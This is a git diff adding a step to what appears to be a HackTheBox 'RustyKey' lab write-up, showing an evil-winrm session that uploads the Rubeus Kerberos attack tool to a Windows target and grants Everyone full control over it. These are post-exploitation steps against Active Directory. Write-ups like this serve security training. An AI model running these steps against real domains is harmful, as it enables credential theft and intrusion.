@@ -596,7 +596,17 @@ But as of now i do not have creds for this `mm.turner` user, so i have two optio
 
 https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe
 
+```python
+evil-winrm-py PS C:\Temp> upload Rubeus.exe .
+Uploading /home/kali/htb/RustyKey/Rubeus.exe: 512kB [00:00, 536kB/s]                                         
+[+] File uploaded successfully as: C:\Temp\Rubeus.exe
+evil-winrm-py PS C:\Temp> icacls "Rubeus.exe" /grant Everyone:F
+processed file: Rubeus.exe
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\Temp>
+```
 
+Ill use the winrm session to upload it, then make it so all users have full control over the bn
 
 
 
